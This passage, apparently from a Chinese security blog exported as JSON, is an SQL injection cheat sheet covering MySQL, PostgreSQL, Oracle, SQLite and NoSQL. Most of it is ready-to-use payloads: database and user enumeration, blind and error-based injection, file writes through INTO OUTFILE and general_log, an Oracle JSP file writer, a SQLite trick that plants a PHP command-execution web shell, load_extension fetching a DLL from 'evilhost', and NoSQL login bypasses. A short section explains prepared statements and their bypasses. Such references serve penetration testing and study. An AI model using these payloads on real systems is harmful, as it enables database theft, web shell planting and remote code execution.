Payload</h3>\n<ul>\n<li>\n<p>Version</p>\n<ul>\n<li><code>SELECT @@version</code></li>\n</ul>\n</li>\n<li>\n<p>Comment</p>\n<ul>\n<li><code>SELECT 1 -- comment</code></li>\n<li><code>SELECT 1 # comment</code></li>\n<li><code>SELECT /*comment*/1</code></li>\n</ul>\n</li>\n<li>\n<p>Space</p>\n<ul>\n<li><code>0x9</code>   <code>0xa-0xd</code>   <code>0x20</code>   <code>0xa0</code></li>\n</ul>\n</li>\n<li>\n<p>Current User</p>\n<ul>\n<li><code>SELECT user()</code></li>\n<li><code>SELECT system_user()</code></li>\n<li><code>SELECT current_role()</code></li>\n</ul>\n</li>\n<li>\n<p>List User</p>\n<ul>\n<li><code>SELECT user FROM mysql.user</code></li>\n</ul>\n</li>\n<li>\n<p>Current Database</p>\n<ul>\n<li><code>SELECT database()</code></li>\n</ul>\n</li>\n<li>\n<p>List Database</p>\n<ul>\n<li><code>SELECT schema_name FROM information_schema.schemata</code></li>\n</ul>\n</li>\n<li>\n<p>List Tables</p>\n<ul>\n<li><code>SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'</code></li>\n</ul>\n</li>\n<li>\n<p>List Columns</p>\n<ul>\n<li><code>SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'</code></li>\n</ul>\n</li>\n<li>\n<p>If</p>\n<ul>\n<li><code>SELECT if(1=1,'foo','bar');</code>  return 'foo'</li>\n</ul>\n</li>\n<li>\n<p>Ascii</p>\n<ul>\n<li>`SELECT char(0x41)</li>\n<li><code>SELECT ascii('A')</code></li>\n<li><code>SELECT 0x414243</code>  =&gt; return  <code>ABC</code></li>\n</ul>\n</li>\n<li>\n<p>Delay</p>\n<ul>\n<li><code>sleep(1)</code></li>\n<li><code>SELECT BENCHMARK(1000000,MD5('A'))</code></li>\n</ul>\n</li>\n<li>\n<p>Read File</p>\n<ul>\n<li><code>select @@datadir``select load_file('databasename/tablename.MYD')</code></li>\n</ul>\n</li>\n<li>\n<p>Blind</p>\n<ul>\n<li><code>ascii(substring(str,pos,length)) &amp; 32 = 1</code></li>\n</ul>\n</li>\n<li>\n<p>Error Based</p>\n<ul>\n<li><code>select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;</code></li>\n<li><code>select count(*) from (select 1 union select null union select !1)x group by concat((select table_name from information_schema.tables limit 1),floor(rand(0)*2))</code></li>\n</ul>\n</li>\n<li>\n<p>Change Password</p>\n<ul>\n<li><code>mysql -uroot -e &quot;use mysql;UPDATE user SET password=PASSWORD('newpassword') WHERE user='root';FLUSH PRIVILEGES;&quot;</code></li>\n</ul>\n</li>\n</ul>\n<h4 id=\"报错注入常见函数\"><a class=\"anchor\" href=\"#报错注入常见函数\">#</a> 报错注入常见函数</h4>\n<ul>\n<li>extractvalue</li>\n<li>updatexml</li>\n<li>GeometryCollection</li>\n<li>linestring</li>\n<li>multilinestring</li>\n<li>multipoint</li>\n<li>multipolygon</li>\n<li>polygon</li>\n<li>exp</li>\n</ul>\n<h3 id=\"写文件\"><a class=\"anchor\" href=\"#写文件\">#</a> 写文件</h3>\n<h4 id=\"写文件前提\"><a class=\"anchor\" href=\"#写文件前提\">#</a> 写文件前提</h4>\n<ul>\n<li>root 权限</li>\n<li>知晓文件绝对路径</li>\n<li>写入的路径存在写入权限</li>\n<li>secure_file_priv 允许向对应位置写入</li>\n<li><code>select count(file_priv) from mysql.user</code></li>\n</ul>\n<h4 id=\"基于into写文件\"><a class=\"anchor\" href=\"#基于into写文件\">#</a> 基于 into 写文件</h4>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span> <span class=\"token keyword\">into</span> <span class=\"token keyword\">outfile</span> <span class=\"token string\">'/tmp/demo.txt'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span> <span class=\"token keyword\">into</span> <span class=\"token keyword\">dumpfile</span> <span class=\"token string\">'/tmp/demo.txt'</span></pre></td></tr></table></figure><p>dumpfile 和 outfile 不同在于，outfile 会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏</p>\n<h4 id=\"基于log写文件\"><a class=\"anchor\" href=\"#基于log写文件\">#</a> 基于 log 写文件</h4>\n<pre><code>show variables like '%general%';\nset global general_log = on;\nset global general_log_file = '/path/to/file';\nselect '&lt;?php var_dump(&quot;test&quot;);?&gt;';\nset global general_log_file = '/original/path';\nset global general_log = off;\n</code></pre>\n<h2 id=\"postgressql-payload\"><a class=\"anchor\" href=\"#postgressql-payload\">#</a> PostgresSQL Payload</h2>\n<ul>\n<li>Version\n<ul>\n<li><code>SELECT version()</code></li>\n</ul>\n</li>\n<li>Comment\n<ul>\n<li><code>SELECT 1 -- comment``SELECT /*comment*/1</code></li>\n</ul>\n</li>\n<li>Current User\n<ul>\n<li><code>SELECT user</code></li>\n<li><code>SELECT current_user</code></li>\n<li>``SELECT session_user`</li>\n<li><code>SELECT getpgusername()</code></li>\n</ul>\n</li>\n<li>List User\n<ul>\n<li><code>SELECT usename FROM pg_user</code></li>\n</ul>\n</li>\n<li>Current Database\n<ul>\n<li><code>SELECT current_database()</code></li>\n</ul>\n</li>\n<li>List Database\n<ul>\n<li><code>SELECT datname FROM pg_database</code></li>\n</ul>\n</li>\n<li>Ascii\n<ul>\n<li><code>SELECT char(0x41)</code></li>\n<li><code>SELECT ascii('A')</code></li>\n</ul>\n</li>\n<li>Delay\n<ul>\n<li><code>pg_sleep(1)</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"oracle-payload\"><a class=\"anchor\" href=\"#oracle-payload\">#</a> Oracle Payload</h2>\n<h3 id=\"常见payload-3\"><a class=\"anchor\" href=\"#常见payload-3\">#</a> 常见 Payload</h3>\n<ul>\n<li>\n<ul>\n<li>\n<p>dump</p>\n<p><code>select * from v$tablespace;``select * from user_tables;``select column_name from user_tab_columns where table_name = 'table_name';``select column_name, data_type from user_tab_columns where table_name = 'table_name';``SELECT * FROM ALL_TABLES</code></p>\n</li>\n</ul>\n</li>\n<li>\n<ul>\n<li>\n<p>Comment</p>\n<p><code>--``/**/</code></p>\n</li>\n</ul>\n</li>\n<li>\n<ul>\n<li>\n<p>Space</p>\n<p><code>0x00</code>   <code>0x09</code>   <code>0xa-0xd</code>   <code>0x20</code></p>\n</li>\n</ul>\n</li>\n<li>\n<ul>\n<li>\n<p>报错</p>\n<p><code>utl_inaddr.get_host_name``ctxsys.drithsx.sn``ctxsys.CTX_REPORT.TOKEN_TYPE``XMLType``dbms_xdb_version.checkin``dbms_xdb_version.makeversioned``dbms_xdb_version.uncheckout``dbms_utility.sqlid_to_sqlhash``ordsys.ord_dicom.getmappingxpath``utl_inaddr.get_host_name``utl_inaddr.get_host_address</code></p>\n</li>\n</ul>\n</li>\n<li>\n<ul>\n<li>\n<p>OOB</p>\n<p><code>utl_http.request``utl_inaddr.get_host_address``SYS.DBMS_LDAP.INIT``HTTPURITYPE``HTTP_URITYPE.GETCLOB</code></p>\n</li>\n</ul>\n</li>\n<li>\n<ul>\n<li>\n<p>绕过</p>\n<p><code>rawtohex</code></p>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"写文件-2\"><a class=\"anchor\" href=\"#写文件-2\">#</a> 写文件</h3>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">create</span> <span class=\"token operator\">or</span> <span class=\"token keyword\">replace</span> directory TEST_DIR <span class=\"token keyword\">as</span> <span class=\"token string\">'/path/to/dir'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">grant</span> <span class=\"token keyword\">read</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">write</span> <span class=\"token keyword\">on</span> directory TEST_DIR <span class=\"token keyword\">to</span> system<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">declare</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>   isto_file utl_file<span class=\"token punctuation\">.</span>file_type<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">begin</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   isto_file :<span class=\"token operator\">=</span> utl_file<span class=\"token punctuation\">.</span>fopen<span class=\"token punctuation\">(</span><span class=\"token string\">'TEST_DIR'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'test.jsp'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'W'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>   utl_file<span class=\"token punctuation\">.</span>put_line<span class=\"token punctuation\">(</span>isto_file<span class=\"token punctuation\">,</span> <span class=\"token string\">'&lt;% out.println(\"test\"); %>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   utl_file<span class=\"token punctuation\">.</span>fflush<span class=\"token punctuation\">(</span>isto_file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   utl_file<span class=\"token punctuation\">.</span>fclose<span class=\"token punctuation\">(</span>isto_file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">end</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"sqlite3-payload\"><a class=\"anchor\" href=\"#sqlite3-payload\">#</a> SQLite3 Payload</h2>\n<ul>\n<li>Comment\n<ul>\n<li><code>--</code></li>\n<li><code>/**/</code></li>\n</ul>\n</li>\n<li>Version\n<ul>\n<li><code>select sqlite_version();</code></li>\n</ul>\n</li>\n</ul>\n<p>Command Execution</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ATTACH <span class=\"token keyword\">DATABASE</span> <span class=\"token string\">'/var/www/lol.php'</span> <span class=\"token keyword\">AS</span> lol<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> lol<span class=\"token punctuation\">.</span>pwn <span class=\"token punctuation\">(</span>dataz <span class=\"token keyword\">text</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> lol<span class=\"token punctuation\">.</span>pwn <span class=\"token punctuation\">(</span>dataz<span class=\"token punctuation\">)</span> <span class=\"token keyword\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;?system($_GET['</span>cmd<span class=\"token string\">']); ?>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">--</span></pre></td></tr></table></figure><p>Load_extension</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>load_extension<span class=\"token punctuation\">(</span><span class=\"token string\">'\\\\evilhost\\evil.dll'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'E'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">--</span></pre></td></tr></table></figure><h2 id=\"nosql-payload\"><a class=\"anchor\" href=\"#nosql-payload\">#</a> NoSQL Payload</h2>\n<h3 id=\"常见payload-4\"><a class=\"anchor\" href=\"#常见payload-4\">#</a> 常见 Payload</h3>\n<ul>\n<li>绕过限制条件\n<ul>\n<li><code>&#123;&quot;username&quot;: &quot;user&quot;&#125;</code>  =&gt;  <code>&#123;&quot;username&quot;: &#123;&quot;ne&quot;: &quot;fakeuser&quot;&#125;&#125;</code></li>\n<li><code>&#123;&quot;$where&quot;: &quot;return true&quot;&#125;</code></li>\n</ul>\n</li>\n<li>测试用字符\n<ul>\n<li><code>'&quot;\\/$[].&gt;</code></li>\n</ul>\n</li>\n<li>布尔测试常用\n<ul>\n<li><code>&#123;&quot;$ne&quot;: -1&#125;</code></li>\n<li><code>&#123;&quot;$in&quot;: []&#125;</code></li>\n<li><code>&#123;&quot;$where&quot;: &quot;return true&quot;&#125;</code></li>\n<li><code>&#123;&quot;$or&quot;: [&#123;&#125;,&#123;&quot;foo&quot;:&quot;1&quot;&#125;]&#125;</code></li>\n</ul>\n</li>\n<li>时间\n<ul>\n<li><code>&#123;&quot;$where&quot;: &quot;sleep(100)&quot;&#125;</code></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"预编译\"><a class=\"anchor\" href=\"#预编译\">#</a> 预编译</h1>\n<h2 id=\"简介-2\"><a class=\"anchor\" href=\"#简介-2\">#</a> 简介</h2>\n<p>SQL 注入是因为解释器将传入的数据当成命令执行而导致的，预编译是用于解决这个问题的一种方法。和普通的执行流程不同，预编译将一次查询通过两次交互完成，第一次交互发送查询语句的模板，由后端的 SQL 引擎进行解析为 AST 或 Opcode，第二次交互发送数据，代入 AST 或 Opcode 中执行。因为此时语法解析已经完成，所以不会再出现混淆数据和代码的过程。</p>\n<h2 id=\"模拟预编译\"><a class=\"anchor\" href=\"#模拟预编译\">#</a> 模拟预编译</h2>\n<p>为了防止低版本数据库不支持预编译的情况，模拟预编译会在客户端内部模拟参数绑定的过程，进行自定义的转义。</p>\n<h2 id=\"绕过\"><a class=\"anchor\" href=\"#绕过\">#</a> 绕过</h2>\n<h3 id=\"预编译使用错误\"><a class=\"anchor\" href=\"#预编译使用错误\">#</a> 预编译使用错误</h3>\n<p>预编译只是使用占位符替代的字段值的部分，如果第一次交互传入的命令使用了字符串拼接，使得命令是攻击者可控的，那么预编译不会生效。</p>\n<h3 id=\"部分参数不可预编译\"><a class=\"anchor\" href=\"#部分参数不可预编译\">#</a> 部分参数不可预编译</h3>\n<p>在有的情况下，数据库处理引擎会检查数据表和数据列是否存在，因此数据表名和列名不能被占位符所替代。这种情况下如果表名和列名可控，则可能引入漏洞。</p>\n<h3 id=\"预编译实现错误\"><a class=\"anchor\" href=\"#预编译实现错误\">#</a> 预编译实现错误</h3>\n<p>部分语言引擎在实现上存在一定问题，可能会存在绕过漏洞。</p>\n<h1 id=\"参考文章\"><a class=\"anchor\" href=\"#参考文章\">#</a> 参考文章</h1>\n<h2 id=\"tricks\"><a class=\"anchor\" href=\"#tricks\">#</a> Tricks</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cud2lsczBuLmNuL2FyY2hpdmVzLzE3OC8=\">sqlmap time based inject 分析</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL05ldFNQSS9TUUxJbmplY3Rpb25XaWtp\">SQLInjectionWiki</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvQnVjQ055Q215QVRkUkVOWnAwQUYyQQ==\">常见数据库写入 Webshell 汇总</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvdUVOdnBQYW43YVZkN01iU29BVDlEZw==\">MSSQL 数据库攻击实战指北</span></li>\n</ul>\n<h2 id=\"bypass\"><a class=\"anchor\" href=\"#bypass\">#</a> Bypass</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvZlNCWlBrTzAtSE5ZZkxnbVlXSktDZw==\">SQL 注入 ByPass 的一些小技巧</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMzY4\">Waf Bypass 之道</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FsZWVuenovTVlTUUxfU1FMX0JZUEFTU19XSUtJ\">MySQL Bypass Wiki</span></li>\n</ul>\n<h2 id=\"nosql\"><a class=\"anchor\" href=\"#nosql\">#</a> NoSQL</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy55dW53ZWlwYWkuY29tL2FyY2hpdmVzLzE0MDg0Lmh0bWw=\">NoSQL 注入的分析和缓解</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvdEc4NzRMTlRJZGlON01QdE8taG92QQ==\">NoSQL 注入</span></li>\n</ul>\n<h2 id=\"cheatsheet-2\"><a class=\"anchor\" href=\"#cheatsheet-2\">#</a> Cheatsheet</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0lnbml0ZXRlY2hub2xvZ2llcy9NU1NRTC1QZW50ZXN0LUNoZWF0c2hlZXQ=\">MSSQL Pentest Cheatsheet</span></li>\n</ul>\n",
            "tags": [
                "网络安全",
                "漏洞",
                "SQL注入"
            ]
        }
    ]
}